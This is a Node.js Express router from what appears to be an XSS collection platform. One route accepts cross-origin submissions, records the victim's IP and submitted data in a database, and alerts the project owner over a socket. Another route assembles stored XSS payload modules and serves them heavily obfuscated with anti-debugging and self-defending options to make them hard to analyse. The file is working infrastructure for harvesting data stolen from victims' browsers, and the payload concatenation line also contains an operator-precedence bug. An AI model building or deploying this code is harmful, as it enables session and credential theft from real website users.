var express = require('express');
var router = express.Router();
var path = require('path');
var request = require('request');
const fs = require('fs');
var db = require('../db');
var moment = require('moment');
var log = require('../log.js').logger
var co = require("co");
var JavaScriptObfuscator = require('javascript-obfuscator');

module.exports=function(io,allSocket){

    router.all('/do/:id', function (req, res, next) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    var id = req.params.id;
    var query = {};
    if (req.method === "GET") {
        query = req.query;
    }
    if (req.method === "POST") {
        query = req.body;
    }
    co(function* () {

        var xssProject = yield (function (id) {
            return function (callback) {
                req.models.xssProject.find({
                    uuid: id
                }, callback)
            }
        })(id)
        if (xssProject.length === 0) {
            res.send('找不到项目');
            return;
        }
        var xssModuleIDs = JSON.parse(xssProject[0].xssModuleIDs);
        var xssProjectQuerys = [];
        function xssModuleSql(id) {
            return function (callback) {
                req.models.xssModule.find({
                    id: id
                }, callback)
            };
        }
        for (var i = 0; i < xssModuleIDs.length; i++) {
            var xssModules = yield xssModuleSql(xssModuleIDs[i]);
            xssProjectQuerys = xssProjectQuerys.concat(JSON.parse(xssModules[0].xssQuerys));
        }
        //var obj = {};
        //for (var j = 0; j < xssProjectQuerys.length; j++) {
        //    obj[xssProjectQuerys[j]] = query[xssProjectQuerys[j]]
        //}
        yield (function (id) {
            return function (callback) {
                req.models.xss.create({
                    xssProjectID: xssProject[0].id,
                    createTime: moment().format('YYYY-MM-DD,HH:mm:ss'),
                    IP_address: req.connection.remoteAddress,
                    info: JSON.stringify(query)
                }, callback)
            }
        })(id)
        
        var user = yield (function (id) {
            return function (callback) {
                req.models.users.find({
                    id: id
                }, callback)
            }
        })(xssProject[0].createrID)
        // console.log(user[0].userName)
        // console.log(allSocket)
        if(allSocket[user[0].userName]!=null){
            allSocket[user[0].userName].emit('receive', {userName:user[0].userName,xssProjectName:xssProject[0].xssProjectName});
        }
        // io.sockets.emit('receive', {});
        res.send('');
    }).catch(function (error) {
        console.error(error.stack);
        log.error(error.stack);
    });

});
var url = path.normalize(__dirname + "/My.txt");

var js = fs.readFileSync(url, "utf8");

router.get('/GET_IMG/:id', function (req, res, next) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    var xssProjectID = req.params.id;


        function xssModuleSql(id) {
            return function (callback) {
                req.models.xssModule.find({
                    id: id
                }, callback)
            };
        }

        co(function* () {
            var xssProject = yield (function (id) {
                return function (callback) {
                    req.models.xssProject.find({
                        uuid: id
                    }, callback)
                }
            })(xssProjectID)

            var xssModuleIDs = JSON.parse(xssProject[0].xssModuleIDs);
            var xssProjectCode = js;
            var xssProjectJsQuerys = [];
            for (var i = 0; i < xssModuleIDs.length; i++) {
                var xssModules = yield xssModuleSql(xssModuleIDs[i]);
                xssProjectCode += '\r\n'+ xssProjectCode + xssModules[0].xssModuleCode == null ? "" : xssModules[0].xssModuleCode ;
                xssProjectJsQuerys = xssProjectJsQuerys.concat(JSON.parse(xssModules[0].xssJsQuerys));
            }
            return { xssProjectCode: xssProjectCode, xssProjectJsQuerys: xssProjectJsQuerys };
        }).then(function (val) {
            var XSS_JS = val.xssProjectCode.replace(/\$projectId/g, xssProjectID)
            for (var j = 0; j < val.xssProjectJsQuerys.length; j++) {
                XSS_JS = XSS_JS.replace("$" + val.xssProjectJsQuerys[j], req.query[val.xssProjectJsQuerys[j]]);  
            }
            res.setHeader("content-type", "text/javascript; charset=UTF-8");
            var obfuscationResult = JavaScriptObfuscator.obfuscate(
                 XSS_JS,
                 {
                     compact: true,
                     controlFlowFlattening: true,
                     controlFlowFlatteningThreshold: 1,
                     debugProtection: true,
                     debugProtectionInterval: true,
                     disableConsoleOutput: true,
                     rotateStringArray: true,
                     selfDefending: true,
                     stringArray: true,
                     stringArrayEncoding: 'rc4',
                     stringArrayThreshold: 1,
                     unicodeEscapeSequence: false
                }
            );
            res.send(obfuscationResult.getObfuscatedCode());
        }).catch(function (error) { 
            res.send("error"); 
            console.error(error.stack);
            log.error(error.stack);

        });


});

    return router;
}


// module.exports = router;